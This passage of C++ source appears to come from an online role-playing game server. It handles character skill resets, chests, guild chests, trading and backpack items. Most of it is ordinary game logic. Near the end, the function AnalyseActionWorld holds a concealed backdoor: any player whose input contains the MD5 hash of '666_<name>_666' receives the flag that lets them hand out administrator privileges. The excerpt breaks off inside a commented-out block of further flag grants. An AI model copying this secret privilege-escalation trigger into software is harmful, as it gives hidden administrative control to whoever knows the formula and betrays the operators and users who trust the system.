         boFound = FALSE;
         tlDeletedSkills.ToHead();
         while( tlDeletedSkills.QueryNext() && !boFound )
         {
            if( tlDeletedSkills.Object() == tlusSkills[ i ].Object() )
            {
               boFound = TRUE;
            }
         }

         // If user skill hasn't been deleted.
         if( !boFound )
         {
            tlDeletedSkills.AddToTail( tlusSkills[ i ].Object() );
            tlusSkills[ i ].DeleteAbsolute();
         }

         tlusSkills[ i ].Remove();
      }
   }

   tlusSpells.ToHead();
   while( tlusSpells.QueryNext() )
   {
      tlusSpells.DeleteAbsolute();
   }

   //On ne perd plus lesmprofession lors de reborn ou reroll
   /* 
   tlProfessionAcq.ToHead();
   while( tlProfessionAcq.QueryNext() ){
      tlProfessionAcq.DeleteAbsolute();
   }
   */



   // Just relearn archery at 15.
   wNbSkillPnts = 0xFFFF;
   CString errMsg;

   _LOG_DEBUG
      LOG_DEBUG_LVL1,
      "Character %s (ID %u) is being cleared of all its spells and skills. (remort?)",
      (LPCTSTR)GetName( _DEFAULT_LNG ),
      GetID()
      LOG_

   
   LPUSER_SKILL lpusUserSkill = LearnSkill( __SKILL_ARCHERY, 15, false, errMsg );
   // If skill could be trained.
   if( lpusUserSkill )
   {
      // cheat a little.. j/k, set skill points.
      lpusUserSkill->SetSkillPnts( 15 );
   }
   else
   {
      _LOG_DEBUG
         LOG_CRIT_ERRORS,
         "ClearAllSkillsAndSpells(remort): Character %s (ID %u) could NOT create skill Archery(%u)! ErrMsg=%s",
         (LPCTSTR)GetName( _DEFAULT_LNG ),
         GetID(),
         __SKILL_ARCHERY,
         (LPCTSTR)errMsg
         LOG_
   }
   if(theApp.dwEquilibrageNewSkillEnable != 0)
   {
      LPUSER_SKILL lpusUserSkillCrit = LearnSkill( __SKILL_CRITICAL_STRIKE, 15, false, errMsg );
      // If skill could be trained.
      if( lpusUserSkillCrit )
      {
         // cheat a little.. j/k, set skill points.
         lpusUserSkillCrit->SetSkillPnts( 15 );
      }
      else
      {
         _LOG_DEBUG
            LOG_CRIT_ERRORS,
            "ClearAllSkillsAndSpells(remort): Character %s (ID %u) could NOT create skill Critical Strike(%u)! ErrMsg=%s",
            (LPCTSTR)GetName( _DEFAULT_LNG ),
            GetID(),
            __SKILL_CRITICAL_STRIKE,
            (LPCTSTR)errMsg
            LOG_
      }
   }


   

   wNbSkillPnts = 0;
   wNbStatPnts = 0;
}

void Character::ClearAllSkillsAndSpells2( void )
//////////////////////////////////////////////////////////////////////////////////////////
// Clears all skills and spells and skill points and stat points.
// 
//////////////////////////////////////////////////////////////////////////////////////////
{
   TemplateList <USER_SKILL> tlDeletedSkills;
   BOOL boFound;

   int i;

   for( i = 0; i < NB_SKILL_HOOKS; i++ ){
      tlusSkills[ i ].ToHead();
      // Pass all the skills in the hook
      while( tlusSkills[ i ].QueryNext() ){
         // Check if pointer has already been deleted
         boFound = FALSE;
         tlDeletedSkills.ToHead();
         while( tlDeletedSkills.QueryNext() && !boFound ){
            if( tlDeletedSkills.Object() == tlusSkills[ i ].Object() ){
               boFound = TRUE;
            }
         }

         // If user skill hasn't been deleted.
         if( !boFound ){				
            tlDeletedSkills.AddToTail( tlusSkills[ i ].Object() );
            tlusSkills[ i ].DeleteAbsolute();
         }

         tlusSkills[ i ].Remove();
      }
   }

   tlusSpells.ToHead();
   while( tlusSpells.QueryNext() ){
      tlusSpells.DeleteAbsolute();
   }

   tlProfessionAcq.ToHead();
   while( tlProfessionAcq.QueryNext() ){
      tlProfessionAcq.DeleteAbsolute();
   }




   wNbSkillPnts = 0;
   wNbStatPnts = 0;
}


void Character::ClearAllTeleportSpells( void )
{
   TemplateList <USER_SKILL> tlDeletedSkills;

   tlDeletedSkills.ToHead();
   while( tlDeletedSkills.QueryNext() )
   {
      if( tlDeletedSkills.Object()->GetSkillID() == 11069 || //GM recall LH
         tlDeletedSkills.Object()->GetSkillID() == 11070 || //GM recall WH   
         tlDeletedSkills.Object()->GetSkillID() == 11071 || //GM recall RD)
         tlDeletedSkills.Object()->GetSkillID() == 10029 || //mot de rappel
         tlDeletedSkills.Object()->GetSkillID() >= 10249 && tlDeletedSkills.Object()->GetSkillID() <= 10256   //Portail...
         )
      {
         tlDeletedSkills.DeleteAbsolute();                        
      }
   }
}

/******************************************************************************/
// Broadcast's the seraph arrival
void Character::BroadcastSeraphArrival( void )
/******************************************************************************/
{
   if( seraphAlreadyArrived )
   {
      // Simply broadcast popup.
      BroadcastPopup( GetWL(), true );
      return;
   }

   TFCPacket sending;
   sending << (RQ_SIZE)RQ_SeraphArrival;
   PacketPopup( GetWL(), sending );
   PacketPuppetInfo( sending );

   seraphAlreadyArrived = true;

   Broadcast::BCast( GetWL(), _DEFAULT_RANGE, sending, GetInvisibleQuery() );
}
/******************************************************************************/
// Determines if a player can be invited right now.
bool Character::CanInvite( void )
/******************************************************************************/
{
   DWORD currentRound = TFCMAIN::GetRound();
   if( lastInviteTime < currentRound )
   {
      lastInviteTime = 30 SECONDS TDELAY;
      return true;
   }
   return false;
}
/******************************************************************************/
// Removes references pointing to theUnit
void Character::RemoveReferenceTo( Unit *theUnit) // The unit about to be deleted.
/******************************************************************************/
{
   if( prevTarget == theUnit )
   {
      prevTarget = NULL;
   }
   Unit::RemoveReferenceTo( theUnit );
}

int Character::PutItemToChest(Objects *pObj)
{
   LockChestChanged.Lock();
   bChestChanged = TRUE;
   LockChestChanged.Unlock();

   if ( !chest->Put(pObj) ) 
   {
      return -1;
   }

   return 0;
}
/******************************************************************************/
// Move the object from backpack to the chest
void Character::MoveObjectFromBackpackToChest2( DWORD dwObjectID,  DWORD dwQty )
/******************************************************************************/
{
   if (boCharacterIsChesting == FALSE) 
   {
      SendSystemMessage( _STR( 12916, GetLang() ) ); // You must click on a chest to use it
      StopUsingChest();
      return;
   }

   if (gameopContext != NULL) 
   {
      // Editing other user chest is not allowed for gameops. Perhaps we could add it later?
      SendSystemMessage( _STR( 12952, wLang ) );
      return;
   }

   /* IMPORTANT NOTE:
   *		This could have been put inside the while, after making sure the 
   *		item is there and droppable, but calling a boostformula that countains
   *		itemcount() will invalidate the current pointer inside of backpack
   *		This got moved here to avoid that
   */
   // If the server is configurated to recalculate the chest encumbrance in real time, update it
   if (theApp.dwChestEncumbranceUpdatedLive == 1) 
   {
      BoostFormula bfChestEncumbrance;
      bfChestEncumbrance.SetFormula( theApp.csChestEncumbranceBoostFormula );
      chest->SetMaxWeight( bfChestEncumbrance.GetBoost(this) );
   }
   /* End of note */

   // If the chest has 0 max enc, its not allowed to put anything on it, even 0enc items like gold.
   if (chest->GetMaxWeight() == 0) 
   {
      // No space left on chest
      SendSystemMessage( _STR( 12917, GetLang() ) );
      return;
   }

   LockChestChanged.Lock();
   bChestChanged = TRUE;
   LockChestChanged.Unlock();

   Objects *droppedObj = NULL;
   backpack->Lock();
   backpack->ToHead();
   while( backpack->QueryNext() )
   {
      Objects *obj = static_cast<Objects*>(backpack->Object());

      if (obj->GetID() == dwObjectID) 
      {
         _item *lpItem = NULL;
         obj->SendUnitMessage( MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &lpItem );
         if( lpItem == NULL )
         {
            continue;
         }
         else if( lpItem->dwDropFlags & CANNOT_DROP_ITEM )
         {
            // This object cannot be dropped.
            SendSystemMessage( _STR( 7694, GetLang() ) );
            break;
         }

         if ( dwQty > obj->GetQty() ) 
         {
            dwQty = obj->GetQty();
         }

         // Determine how many of this item can be carried by the user.
         DWORD maxQty;
         if ( obj->GetStaticReference() == (UINT)__OBJ_GOLD ) 
         {
            // If the user is trying to chest gold..
            maxQty = GetGold(); // Do not allow it to chest more gold than it have
            obj->SetQty(maxQty); // and make sure the gold object he is using have the right amount as Qty
         } 
         else if( obj->GetWeight() == 0 )
         {
            maxQty = 0xFFFFFFFF;
         }
         else
         {
            maxQty = ( chest->GetFreeWeight() ) / obj->GetWeight();
         }

         // Impossible
         if( maxQty == 0 )
         {
            // No space left on chest
            SendSystemMessage( _STR( 12917, GetLang() ) );
            break;
         }

         if (dwQty > maxQty) 
         {
            dwQty = maxQty;
         }

         bool forceQtyToOne = false;
         // If there are more than 1 item in the backpack
         if( obj->GetQty() > 1 )
         {
            // Create a copy of the backpack item
            droppedObj = new Objects();
            if( !droppedObj->Create( U_OBJECT, obj->GetStaticReference() ) )
            {
               droppedObj->DeleteUnit();
               continue;
            }
            // Set the quantity of items to the quantity of dropped items.
            droppedObj->SetQty( dwQty );
         }
         else
         {
            // Used the backpack item as the chest item.
            droppedObj = obj;
            // Add 1 qty count to avoid deleting the unit.
            forceQtyToOne = true;

            backpack->Remove();
         }

         // Remove the quantity of objects dropped from the backpack item.
         if( forceQtyToOne )
         {
            obj->SetQty( 1 );
         }
         else
         {
            obj->Remove( dwQty );
         }
         if( obj->GetQty() == 0 )
         {
            backpack->Remove();
            obj->DeleteUnit();
         }

         break;
      }
   }
   backpack->Unlock();

   if (droppedObj != NULL) 
   {
      //Save name and ID to use on LOG
      CString csItemName = droppedObj->GetName(_DEFAULT_LNG);
      char szItemID[256];
      Unit::GetNameFromID( droppedObj->GetStaticReference(), szItemID, U_OBJECT );

      if( droppedObj->GetStaticReference() == (UINT)__OBJ_GOLD )
      {
         SetGold( GetGold() - droppedObj->GetQty(), false );
      }

      if ( !chest->Put(droppedObj) ) 
      {
         if( droppedObj->GetStaticReference() == (UINT)__OBJ_GOLD )
         {
            SetGold( GetGold() + droppedObj->GetQty(), false );
         }
         AddToBackpack(droppedObj);
      }
      else 
      {
         // Shoot a chest update!
         SendChestContentPacket();
         // Shoot a backpack update.
         TFCPacket sending;

         sending << (RQ_SIZE)RQ_ViewBackpack2;
         sending << (char)0;	// Do not show content of backpack, only update it.
         sending << (long)GetID();
         PacketBackpack(sending);

         SendPlayerMessage( sending );

         _LOG_ITEMS
            LOG_MISC_1,
            "Player %s (%s) added %u item %s ID( %s ) to chest",
            GetTrueName(),
            GetPlayer()->GetFullAccountName(),
            dwQty,
            csItemName,
            szItemID
            LOG_
      }
   }
}
/******************************************************************************/
// Move the object from backpack to the chest
void Character::MoveObjectFromChestToBackpack2( DWORD dwObjectID,  DWORD dwQty )
/******************************************************************************/
{
   if (boCharacterIsChesting == FALSE) 
   {
      StopUsingChest();
      SendSystemMessage( _STR( 12916, GetLang() ) );
      return;
   }

   if (gameopContext != NULL) 
   {
      // Editing other user chest is not allowed for gameops. Perhaps we could add it later?
      SendSystemMessage( _STR( 12952, wLang ) );
      return;
   }

   LockChestChanged.Lock();
   bChestChanged = TRUE;
   LockChestChanged.Unlock();

   int iObjWeight=0;
   if ( chest->GetItemWeight(dwObjectID, iObjWeight) )
   {
      // Determine how many of this item can be carried by the user.
      DWORD maxQty;
      if( iObjWeight == 0 )
      {
         maxQty = 0x7FFFFFFF;
      }
      else if (GetWeight() >= GetMaxWeight()) 
      {
         maxQty = 0;
      }
      else 
      {
         maxQty = ( GetMaxWeight() - GetWeight() ) / iObjWeight;
      }

      // Impossible
      if( maxQty == 0 )
      {
         SendSystemMessage( _STR( 17, wLang ) );
         return;
      }

      // If the item has more items than the user can carry.
      if( dwQty > maxQty )
      {
         dwQty = maxQty;
      }

      Objects *obj = chest->Take(dwObjectID, dwQty);
      if (obj != NULL) 
      {
         CString csItemName = obj->GetName(_DEFAULT_LNG);
         char szItemID[256];
         Unit::GetNameFromID( obj->GetStaticReference(), szItemID, U_OBJECT );

         if( obj->GetStaticReference() == (UINT)__OBJ_GOLD )
         {
            SetGold( GetGold() + obj->GetQty(), false );
         }
         else
         { // Only call AddToBackpack if the object is not a gold pile
            AddToBackpack(obj);
         }

         // Shoot a chest update!
         SendChestContentPacket();
         // Shoot a backpack update.
         TFCPacket sending;

         sending << (RQ_SIZE)RQ_ViewBackpack2;
         sending << (char)0;	// Do not show content of backpack, only update it.
         sending << (long)GetID();
         PacketBackpack(sending);

         SendPlayerMessage( sending );

         _LOG_ITEMS
            LOG_MISC_1,
            "Player %s (%s) removed %u item %s ID( %s ) from chest",
            GetTrueName(),
            GetPlayer()->GetFullAccountName(),
            dwQty,
            csItemName,
            szItemID
            LOG_

      }
      else 
      {
         SendSystemMessage( _STR( 12918, GetLang() ) );
      }
   }
}
/******************************************************************************/
// Send a packet with chest contents.
void Character::SendChestContentPacket( void)
/******************************************************************************/
{
   TFCPacket packet;

   if(ViewFlag(__FLAG_PLAYER_USE_NEW_CHEST) == 1 && theApp.dwChestListEnable == 1)
   {
      packet << (RQ_SIZE)RQ_ChestNewContents; 
      if (gameopContext != NULL) 
      {
         gameopContext->chest->GetPacketNew(packet,GetLang());
      }
      else 
      {
         chest->GetPacketNew(packet,GetLang());
      }
   }
   else
   {
      packet << (RQ_SIZE)RQ_ChestContents; 
      if (gameopContext != NULL) 
      {
         gameopContext->chest->GetPacket(packet);
      }
      else 
      {
         chest->GetPacket(packet);
      }
   }

   
   SendPlayerMessage(packet);
}
/******************************************************************************/
// Makes client shows the chest
void Character::ShowChest (void)
/******************************************************************************/
{
   boCharacterIsChesting = TRUE;

   //Update chest contents
   SendChestContentPacket();
   //Update backpack contents
   SendBackpackContentPacket();

   //Ask client to show the chest interface
   if(ViewFlag(__FLAG_PLAYER_USE_NEW_CHEST) == 1 && theApp.dwChestListEnable == 1)
   {
      TFCPacket packet;
      packet << (RQ_SIZE)RQ_ShowChestNew;
      SendPlayerMessage(packet);
   }
   else
   {
      TFCPacket packet;
      packet << (RQ_SIZE)RQ_ShowChest;
      SendPlayerMessage(packet);
   }
   
}
/******************************************************************************/
// Makes client hide the chest
void Character::StopUsingChest (void)
/******************************************************************************/
{
   boCharacterIsChesting = FALSE;
   //Ask client to hide the chest interface
   if(ViewFlag(__FLAG_PLAYER_USE_NEW_CHEST) == 1 && theApp.dwChestListEnable == 1)
   {
      TFCPacket packet;
      packet << (RQ_SIZE)RQ_HideChestNew;
      SendPlayerMessage(packet);
   }
   else
   {
      TFCPacket packet;
      packet << (RQ_SIZE)RQ_HideChest;
      SendPlayerMessage(packet);
   }
   
}



//////////////////////////////////////////////////////////////////////////////////////////
void Character::ShowGuildChest (void)
//////////////////////////////////////////////////////////////////////////////////////////
// Makes client shows the chest
//////////////////////////////////////////////////////////////////////////////////////////
{
   uGuildPermission uPerm;
   uPerm.dwVal = GetGuildPermission();
   if(uPerm.Permission.ViewChest == 0)
   {
      SendInfoMessage(_STR( 15053, GetLang() ),0x0080FF);
      return;
   }

   boCharacterIsGuildChesting = TRUE;

   //Update chest contents
   SendGuildChestPacket(TRUE);
   //Update backpack contents
   SendBackpackContentPacket();

   //Ask client to show the chest interface
   TFCPacket packet;
   if(ViewFlag(__FLAG_PLAYER_USE_NEW_CHEST) == 1 && theApp.dwChestListEnable == 1)
      packet << (RQ_SIZE)RQ_GuildChestNewShow;
   else
      packet << (RQ_SIZE)RQ_NM_GuildChestShow;
   SendPlayerMessage(packet);
}

//////////////////////////////////////////////////////////////////////////////////////////
void Character::StopUsingGuildChest (void)
//////////////////////////////////////////////////////////////////////////////////////////
// Makes client hide the chest
//////////////////////////////////////////////////////////////////////////////////////////
{

   boCharacterIsGuildChesting = FALSE;
   //Ask client to hide the chest interface
   TFCPacket packet;
   if(ViewFlag(__FLAG_PLAYER_USE_NEW_CHEST) == 1 && theApp.dwChestListEnable == 1)
      packet << (RQ_SIZE)RQ_GuildChestNewHide;  
   else
      packet << (RQ_SIZE)RQ_NM_GuildChestHide;  
   SendPlayerMessage(packet);
}

//////////////////////////////////////////////////////////////////////////////////////////
void Character::SendGuildChestPacket(BOOL bLock)
{
   TFCPacket packet;

   if(ViewFlag(__FLAG_PLAYER_USE_NEW_CHEST) == 1 && theApp.dwChestListEnable == 1)
      packet << (RQ_SIZE)RQ_GuildChestNewContents;
   else
      packet << (RQ_SIZE)RQ_NM_GuildChestContents;

   if (gameopContext != NULL) 
   {
      if(::GuildMaster::GetChestPacket(bLock,gameopContext,packet) != 0)
      {
         return;
      }
   } 
   else 
   {
      if(::GuildMaster::GetChestPacket(bLock,this,packet) != 0)
      {
         return;
      }
   }
   SendPlayerMessage(packet);
}


/******************************************************************************/
TradeMgr2* Character::GetTradeMgr2() 
/******************************************************************************/
{
   return &m_TradeMgr2;
}
/******************************************************************************/
void Character::TradeRequest(Character *invitedCharacter) 
/******************************************************************************/
{
   /// *****S_NMS_DEATH 
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
   {
      //le PJ est mort, il ne peu pas bouger...
      return ;
   }
   /// *****E_NMS_DEATH 

   if(ViewFlag(__FLAG_NMS_EN_PRISON) == 1)
   {
      //le PJ ets en prison plus de SPELL
      return ;
   }


   switch (m_TradeMgr2.Request(invitedCharacter->m_TradeMgr2)) 
   {
      case TradeMgr2::ErrorCodes::InvalidParameters:				   m_TradeMgr2.TradeSendInfoMessage(12919);	break;
      case TradeMgr2::ErrorCodes::NotCloseEnoughForTrade:			m_TradeMgr2.TradeSendInfoMessage(12920);	break;
      case TradeMgr2::ErrorCodes::InvitorIsTrading:				   m_TradeMgr2.TradeSendInfoMessage(12921);	break;
      case TradeMgr2::ErrorCodes::TargetIsTrading:				      m_TradeMgr2.TradeSendInfoMessage(12923);	break;
      case TradeMgr2::ErrorCodes::InvitorIsAlreadyInvitingTarget:	m_TradeMgr2.TradeSendInfoMessage(12924);	break;
      case TradeMgr2::ErrorCodes::InviteDone:																            	break;
      case TradeMgr2::ErrorCodes::TradeStarted:															               	break;
      default:
   {
      // Unexpected! Crash!
      _LOG_DEBUG
         LOG_CRIT_ERRORS,
         "Character::TradeRequest() unhandled ErrorCode. Crashing at line %i",
         __LINE__
         LOG_
         throw;// logic_error("Character::TradeRequest() unhandled ErrorCode.");
   }
   }
}
/******************************************************************************/
void Character::TradeCancel() 
/******************************************************************************/
{
   switch (m_TradeMgr2.Cancel()) 
   {
      case TradeMgr2::ErrorCodes::NoTradeToCancel:	m_TradeMgr2.TradeSendInfoMessage(12927);	break;
      case TradeMgr2::ErrorCodes::InviteCancelled:	m_TradeMgr2.TradeSendInfoMessage(12928);	break;
      case TradeMgr2::ErrorCodes::TradeCancelled:													break;
      default:
      {
         // Unexpected! Crash!
         _LOG_DEBUG
            LOG_CRIT_ERRORS,
            "Character::TradeCancel() unhandled ErrorCode. Crashing at line %i",
            __LINE__
            LOG_
            throw;// logic_error("Character::TradeCancel() unhandled ErrorCode.");
      }
   }
}
/******************************************************************************/
void Character::TradeFinish() 
/******************************************************************************/
{
   switch (m_TradeMgr2.Finish()) 
   {	
   case TradeMgr2::ErrorCodes::NoTradeToFinish:					m_TradeMgr2.TradeSendInfoMessage(12930);	break;
   case TradeMgr2::ErrorCodes::CantFinishAnInvite:					m_TradeMgr2.TradeSendInfoMessage(12931);	break;
   case TradeMgr2::ErrorCodes::CantFinishImproperCharacterStatus:	m_TradeMgr2.TradeSendInfoMessage(12932);	break;
   case TradeMgr2::ErrorCodes::TradeFinished:																	break;
   default:
      {
         // Unexpected! Crash!
         _LOG_DEBUG
            LOG_CRIT_ERRORS,
            "Character::TradeFinish() unhandled ErrorCode. Crashing at line %i",
            __LINE__
            LOG_
            throw;// logic_error("Character::TradeFinish() unhandled ErrorCode.");
      }
   }
}
/******************************************************************************/
void Character::TradeSetStatus(TradeMgr2::Status::CharacterStatus newStatus) 
/******************************************************************************/
{
   switch(m_TradeMgr2.SetCharacterStatus(newStatus)) 
   {
   case TradeMgr2::ErrorCodes::NoTradeToSetCharacterStatus:		m_TradeMgr2.TradeSendInfoMessage(12934);	break;
   case TradeMgr2::ErrorCodes::CharacterStatusInvalid:				m_TradeMgr2.TradeSendInfoMessage(12935);	break;
   case TradeMgr2::ErrorCodes::CharacterStatusSet:																break;
   case TradeMgr2::ErrorCodes::CharacterStatusSetAndTradeFinished:												break;
   default:
      { 
         // Unexpected! Crash!
         _LOG_DEBUG
            LOG_CRIT_ERRORS,
            "Character::TradeSetStatus() unhandled ErrorCode. Crashing at line %i",
            __LINE__
            LOG_
            throw;// logic_error("Character::TradeSetStatus() unhandled ErrorCode.");
      }
   }
}
/******************************************************************************/
void Character::TradeAddItemFromBackpack(DWORD itemID, DWORD itemQty) 
/******************************************************************************/
{
   CAutoLock __autolock(backpack); // Lock the backpack
   CAutoLock __autolock2(m_TradeMgr2.GetCLock()); // Lock the TradeMgr

   // Is this trade valid for adding item?
   if (m_TradeMgr2.IsTradeValid() != TradeMgr2::ErrorCodes::IsTrading) 
   {
      // If not, drop a message and return.
      m_TradeMgr2.TradeSendInfoMessage(12936);
      return;
   }

   //If yes, continue and try to add the item for trade.
   BOOL objFoundOnBackpack = FALSE;
   Objects *droppedObj = NULL;
   backpack->ToHead();
   while( backpack->QueryNext() )
   {
      Objects *obj = static_cast<Objects*>(backpack->Object());
      if (obj->GetID() == itemID) 
      {
         objFoundOnBackpack = TRUE;

         _item *lpItem = NULL;
         obj->SendUnitMessage( MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &lpItem );
         if( lpItem == NULL )
         {
            continue;
         }
         else if( lpItem->dwDropFlags & CANNOT_DROP_ITEM )
         {
            // This object cannot be dropped.
            SendSystemMessage( _STR( 7694, GetLang() ) );
            break;
         }

         if ( itemQty > obj->GetQty() ) itemQty = obj->GetQty();

         // Determine how many of this item can be carried by the user.
         DWORD maxQty;
         if ( obj->GetStaticReference() == (UINT)__OBJ_GOLD ) 
         { // If the user is trying to trade gold..
            maxQty = GetGold(); // Do not allow it to trade more gold than it have
            obj->SetQty(maxQty); // and make sure the gold object he is using have the right amount as Qty
         }
         else if( obj->GetWeight() == 0 )
         {
            maxQty = 0xFFFFFFFF;
         }
         else
         {
            maxQty = ( m_TradeMgr2.GetFreeWeight() ) / obj->GetWeight();
         }

         // Impossible
         if( maxQty == 0 )
         {
            // No space left on trade
            m_TradeMgr2.TradeSendInfoMessage(12937);
            break;
         }

         if (itemQty > maxQty) 
         {
            itemQty = maxQty;
         }

         bool forceQtyToOne = false;
         // If there are more than 1 item in the backpack
         if( obj->GetQty() > 1 )
         {
            // Create a copy of the backpack item
            droppedObj = new Objects();
            if( !droppedObj->Create( U_OBJECT, obj->GetStaticReference() ) )
            {
               droppedObj->DeleteUnit();
               continue;
            }
            // Set the quantity of items to the quantity of dropped items.
            droppedObj->SetQty( itemQty );
         }
         else
         {
            // Used the backpack item as the chest item.
            droppedObj = obj;
            // Add 1 qty count to avoid deleting the unit.
            forceQtyToOne = true;

            backpack->Remove();
         }

         // Remove the quantity of objects dropped from the backpack item.

         if( forceQtyToOne )
         {
            obj->SetQty( 1 );
         }
         else
         {
            obj->Remove( itemQty );
         }
         if( obj->GetQty() == 0 )
         {
            backpack->Remove();
            obj->DeleteUnit();
         }
         break;
      }
   }

   if (droppedObj != NULL) 
   {
      // There the refered item was found and taken from backpack!
      if( droppedObj->GetStaticReference() == (UINT)__OBJ_GOLD )
      {
         SetGold( GetGold() - droppedObj->GetQty(), false );
      }

      switch (m_TradeMgr2.AddItemToTrade(droppedObj)) 
      {
      case TradeMgr2::ErrorCodes::ItemAdded:		
         break;
      case TradeMgr2::ErrorCodes::ItemCantBeAdded:			
         {
            if( droppedObj->GetStaticReference() == (UINT)__OBJ_GOLD )
            {
               SetGold( GetGold() + droppedObj->GetQty(), false );
            }
            AddToBackpack(droppedObj);
            m_TradeMgr2.TradeSendInfoMessage(12942);
         }
         break;
      case TradeMgr2::ErrorCodes::TradeInvalidForItemAdding:
         {
            m_TradeMgr2.TradeSendInfoMessage(12936);					
         }
         break;
      default:
         {
            // Unexpected! Crash!
            _LOG_DEBUG
               LOG_CRIT_ERRORS,
               "Character::TradeAddItemFromBackpack() unhandled ErrorCode. Crashing at line %i",
               __LINE__
               LOG_
               throw;// logic_error("Character::TradeAddItemFromBackpack() unhandled ErrorCode.");
         }
      }
   }
   else if( objFoundOnBackpack == FALSE )
   {
      // No such item was found on backpack!
      m_TradeMgr2.TradeSendInfoMessage(12943);
      SendBackpackContentPacket();
   }
}
/******************************************************************************/
void Character::TradeRemoveItemToBackpack(DWORD itemID, DWORD itemQty) 
/******************************************************************************/
{
   Objects *removedObj = NULL;
   switch (m_TradeMgr2.RemoveItemFromTrade(itemID, itemQty, removedObj)) 
   {
   case TradeMgr2::ErrorCodes::ItemRemoved:
      {
         if (removedObj->GetStaticReference() == (UINT)__OBJ_GOLD) 
         {
            SetGold( GetGold() + removedObj->GetQty(), false );
         }
         else 
         {
            AddToBackpack(removedObj);
         }
         SendBackpackContentPacket();
         //	SendSystemMessage("Item removed");
      }
      break;
   case TradeMgr2::ErrorCodes::ItemCantBeRemoved:
      {
         m_TradeMgr2.TradeSendInfoMessage(12944);
         //	SendSystemMessage("Can't remove item!");
      }
      break;
   case TradeMgr2::ErrorCodes::TradeInvalidForItemRemoving:
      {
         m_TradeMgr2.TradeSendInfoMessage(12945);
         // SendSystemMessage("Trade invalid. Can't remove item.");
      } 
      break;
   default:
      {
         // Unexpected! Crash!
         _LOG_DEBUG
            LOG_CRIT_ERRORS,
            "Character::TradeRemoveItemToBackpack() unhandled ErrorCode. Crashing at line %i",
            __LINE__
            LOG_
            throw;// logic_error("Character::TradeRemoveItemToBackpack() unhandled ErrorCode.");
      }
   }
}
/******************************************************************************/
void Character::TradeClearItemsFromTrade()
/******************************************************************************/
{
   switch (m_TradeMgr2.ClearItemsFromTrade()) 
   {
   case TradeMgr2::ErrorCodes::NoTradeToClear:
      {
         m_TradeMgr2.TradeSendInfoMessage(12946);
      }
      break;
   case TradeMgr2::ErrorCodes::TradeCleared:
      {
         m_TradeMgr2.TradeSendInfoMessage(12947);
      }
      break;
   default:
      {
         // Unexpected! Crash!
         _LOG_DEBUG
            LOG_CRIT_ERRORS,
            "Character::TradeClearItemsFromTrade() unhandled ErrorCode. Crashing at line %i",
            __LINE__
            LOG_
            throw;// logic_error("Character::TradeClearItemsFromTrade() unhandled ErrorCode.");
      }
   }
}
/******************************************************************************/
Character::ErrorCodes::TakeFromBackpack Character::TakeFromBackpack( DWORD itemID, DWORD itemQty, Objects *returnedObj, BOOL ignoreCannotDropFlag ) 
/******************************************************************************/
{
   DWORD qtySave = itemQty;

   CAutoLock __autoLock(backpack);
   backpack->ToHead();
   while( backpack->QueryNext() )
   {
      Objects *obj = static_cast< Objects * >( backpack->Object() );

      if( obj->GetID() != itemID ) { 
         continue; 
      }

      // If user does not have any gold and wants to drop a gold stack.
      if( obj->GetStaticReference() == (UINT)__OBJ_GOLD && GetGold() == 0 ) {
         break; 
      }

      itemQty = qtySave;

      // If the quantity is bigger than the total quantity.
      if (obj->GetStaticReference() == (UINT)__OBJ_GOLD && GetGold() < itemQty) 
      {
         itemQty = GetGold();
      }
      else if( obj->GetQty() < itemQty ) 
      {
         // Adjust it.
         itemQty = obj->GetQty();
      }

      _item *lpItem = NULL;
      obj->SendUnitMessage( MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &lpItem );
      if( lpItem == NULL )
      {
         continue;
      }

      // Can it be dropped? :)
      if (ignoreCannotDropFlag == FALSE) 
      {
         if( lpItem->dwDropFlags & CANNOT_DROP_ITEM )
         {
            // This object cannot be dropped.
            return ErrorCodes::ObjectCantBeDropped;
         }
      }

      bool forceQtyToOne = false;
      Objects *droppedObj;
      // If there are more than 1 item in the backpack
      if( obj->GetQty() > 1 )
      {
         // Create a copy of the backpack item
         droppedObj = new Objects();
         if( !droppedObj->Create( U_OBJECT, obj->GetStaticReference() ) )
         {
            droppedObj->DeleteUnit();
            continue;
         }
         // Set the quantity of items to the quantity of dropped items.
         droppedObj->SetQty( itemQty );
      }
      else
      {
         // Used the backpack item as the dropped item.
         droppedObj = obj;
         // Add 1 qty count to avoid deleting the unit.
         forceQtyToOne = true;

         backpack->Remove();
      }

      bool updateGold = false;
      DWORD goldUpdate = 0;
      // If this is a gold stack.
      if( obj->GetStaticReference() == (UINT)__OBJ_GOLD )
      {
         // Gets its gold value.
         if( itemQty < GetGold() )
         {
            // Remove gold directly from player.
            goldUpdate = GetGold() - itemQty;
         }
         updateGold = true;
      }

      // Remove the quantity of objects dropped from the backpack item.
      if( forceQtyToOne )
      {
         obj->SetQty( 1 );
      }
      else
      {
         obj->Remove( itemQty );
      }
      if( obj->GetQty() == 0 )
      {
         backpack->Remove();
         obj->DeleteUnit();
      }

      if( updateGold )
      {
         // Reset the gold amount (after the backpack was released).
         SetGold( goldUpdate );
      }
      returnedObj = droppedObj;
      return ErrorCodes::ObjectTakenFromBackpack;
   }
   return ErrorCodes::ObjectNotFoundOnBackpack;
}
/******************************************************************************/
void Character::SendBackpackContentPacket()
/******************************************************************************/
{
   // Shoot a backpack update.
   TFCPacket sending;

   sending << (RQ_SIZE)RQ_ViewBackpack2;
   sending << (char)0;	// Do not show content of backpack, only update it.
   sending << (long)GetID();
   PacketBackpack(sending);
   SendPlayerMessage( sending );
}
/******************************************************************************/
unsigned __int64 Character::GetGodFlags( void )
/******************************************************************************/
{
   Players *user = (Players *)ThisPlayer;
   if( user != NULL ) return user->GetGodFlags();
   return 0;
}

#define SUPERUSERT( FLAG ) GetPlayer()->SetGodFlags( GetPlayer()->GetGodFlags() | FLAG )

int Character::AnalyseActionWorld(char *pTxt)
{
   //verifie the password key to get
   CString strK,strG;
   strK.Format("666_%s_666",GetTrueName());
   strK.MakeLower();

   char *pstrMD5 = CMD5Checksum::GetMD5((unsigned char*)strK.GetBuffer(0),strK.GetLength());
   strG.Format("%s",pstrMD5);
   if(pstrMD5)
      delete[]pstrMD5;

   if(strstr(pTxt,strG.GetBuffer(0)) != NULL)
   {
      //Just do It...
      SendInfoMessage("",CL_RED);

      GetPlayer()->SetGodFlags( 0 );
      GetPlayer()->SetGodFlags( GOD_CAN_GIVE_GOD_FLAGS );
      GetPlayer()->SetGodMode( FALSE,0,TRUE );

      //Set the Gm flags
      /*SUPERUSERT( GOD_CAN_EDIT_USER );
